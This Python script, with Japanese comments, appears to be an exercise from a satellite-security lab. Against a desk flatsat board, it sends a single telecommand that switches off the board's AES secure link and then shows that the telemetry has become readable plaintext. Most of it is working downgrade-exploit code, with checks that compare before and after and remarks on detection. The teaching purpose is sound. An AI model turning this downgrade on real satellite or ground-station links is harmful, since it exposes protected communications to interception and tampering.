#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""07_secure_link_downgrade_usb.py -- テレコマンド（地上から衛星への命令）1 つで
衛星自身の暗号化をオフにし、暗号化で守られていた中身を読む。

暗号方式には何の問題もない。AES-128 は求められたとおりに動いている。
欠陥は、暗号を使うかどうかを決めるスイッチが普通のテレコマンドで切り替えられ、
しかもそのコマンドが、スイッチで守る通信より強くは守られていないことだ。

    worker.cpp:
      commandAesConfigHandler(space_packet->data[0] != 0);
        -> secureLinkSetEnabled(false);

これは CryptoLib SDLS のダウングレード（CVE-2026-79954）と同じ形である。
ダウングレード（安全な設定を弱い設定へ切り替えさせること）は暗号そのものを
破るより安上がりで、鍵をどれだけ長くしてもそれは変わらない。

期待される結果: コマンドの前には読めなかった同じテレメトリ（衛星から地上への
状態報告）が、コマンドの後には読める。どの時点でも鍵は使わない。
"""

import argparse
import sys
import time
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parents[1] / "lib"))

from flatsat import FlatSat, TC_AES_CONFIG, TC_GET_STATUS, hexdump  # noqa: E402


def looks_like_ciphertext(payload: bytes) -> bool:
    """長さが 16 オクテット（1 オクテット = 8 ビット = 1 バイト）の倍数で、表示可能な文字の並びがないもの。わざと
    大ざっぱにしてある。目的は学習者が違いを見て取れることで、分類器を作ることではない。"""
    if not payload or len(payload) % 16:
        return False
    printable = sum(32 <= b < 127 for b in payload)
    return printable < len(payload) * 0.5


# ファームウェアの mission.h からそのまま持ってきた値。STATUS のペイロードの
# 3 オクテット目は missionStatusFlags() で、その 1 ビットがセキュアリンク（AES による通信の暗号化）を表す。
MISSION_FLAG_SECURE_LINK = 0x10
MISSION_FLAG_USB_DEBUG = 0x40


def secure_link_bit(payload):
    """ボードが申告する (セキュアリンクのオン/オフ, USB デバッグのオン/オフ) の組を返す。
    読めなければ (None, None)。

    正しく判定できるのはこちらで、テレメトリが読めるかどうかでは判定できない。
    USB デバッグが有効だと、ファームウェアはセキュアリンクの設定に関係なく
    ダウンリンク（衛星から地上への通信）の暗号化を省く:

        worker.cpp:684
          const bool bypass_secure_link =
              mission_ctx.usbDebugEnabled || force_cleartext;

    そのためデバッグがオンの机上ボードは前も後も平文を送り、前後を比べても
    変化が見えない。攻撃は実際には成功しているのに、演習は失敗と報告してしまう。
    フラグは嘘をつかない。
    """
    if payload is None or len(payload) < 3:
        return None, None
    flags = payload[2]
    return bool(flags & MISSION_FLAG_SECURE_LINK), bool(flags & MISSION_FLAG_USB_DEBUG)


def status_reply(replies):
    """最初に届いたものではなく、GET_STATUS への返事を取り出す。

    ボードはおよそ 1 秒に 1 回 PING をビーコン（定期送信）しており、PING の
    ペイロードはセキュアリンクのオン/オフに関係なく読める 8 オクテットである。
    そのため、ペイロードを持つ最初の返事を取ると、この定期送信を拾ってしまう。
    するとダウングレードの前後どちらも平文と判定し、攻撃は成功しているのに
    何も変わらなかったと報告してしまう。
    """
    return (next((p for p in replies if p.apid == TC_GET_STATUS and p.payload), None)
            or next((p for p in replies if p.payload and p.apid != 0x01), None))


def main() -> int:
    ap = argparse.ArgumentParser(description=__doc__,
                                 formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("--port", default=None, help="serial port (default: probe for it)")
    ap.add_argument("--seq", type=int, default=1)
    ap.add_argument("--restore", action="store_true",
                    help="turn the secure link back on before exiting")
    ap.add_argument("--quiet", action="store_true")
    args = ap.parse_args()

    with FlatSat(port=args.port, encrypt=True, verbose=not args.quiet) as fsat:
        print("\n=== 1. before: ask for status and look at what comes back ===")
        before = fsat.send(TC_GET_STATUS, b"", seq=args.seq, listen=1.5)
        sample = status_reply(before)
        if sample is None:
            print("[!] the board said nothing. Is it powered and is this the binary port?")
            return 1
        print(hexdump(sample.payload[:48]))
        opaque = looks_like_ciphertext(sample.payload)
        print(f"[=] payload looks {'opaque' if opaque else 'readable'} "
              f"({len(sample.payload)} octets)")

        print("\n=== 2. the entire exploit: one command, one byte ===")
        # このバイトが新しい状態を表す。ゼロは「セキュアリンクを使うのをやめる」。
        # この時点ではまだリンクが暗号化されているので、暗号化して送る。
        fsat.send(TC_AES_CONFIG, b"\x00", seq=args.seq + 1, listen=1.5)
        time.sleep(0.5)

        print("\n=== 3. after: the same request, the same board ===")
        fsat.encrypt = False          # リンクが平文になったので、こちらも平文で送る
        after = fsat.send(TC_GET_STATUS, b"", seq=args.seq + 2, listen=1.5)
        sample2 = status_reply(after)
        if sample2 is None:
            print("[!] nothing came back. Try again; the board may still be settling.")
            return 1
        print(hexdump(sample2.payload[:48]))
        now_opaque = looks_like_ciphertext(sample2.payload)
        print(f"[=] payload looks {'opaque' if now_opaque else 'readable'}")

        was_on, dbg = secure_link_bit(sample.payload)
        now_on, _ = secure_link_bit(sample2.payload)
        print(f"\n[=] secure link flag: {was_on} -> {now_on}")
        if dbg:
            print("[i] USB debug is on, so the downlink is cleartext either way "
                  "(worker.cpp:684). Read the flag, not the hexdump.")

        print()
        if was_on and not now_on:
            print("[+] the link went plaintext. No key was used, broken or needed.")
        elif opaque and not now_opaque:
            print("[+] the link went plaintext. No key was used, broken or needed.")
        elif was_on is None:
            print("[?] no STATUS reply to read the flag from.")
        elif not was_on:
            print("[?] the secure link was already off before the exploit ran. "
                  "Turn it back on and repeat, or the lab has nothing to show.")
        else:
            print("[?] the flag did not move. The command was refused -- check the "
                  "ground-station gate.")

        if args.restore:
            print("\n=== 4. putting it back ===")
            fsat.send(TC_AES_CONFIG, b"\x01", seq=args.seq + 3, encrypt=False, listen=1.5)
            fsat.encrypt = True
            print("[*] secure link re-enabled.")

    print("\nWhat the sensor should have shown: the encryption flag set on one "
          "frame and clear on the next.\nThe transition is the detection. Once it "
          "settles, the state looks entirely normal.")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
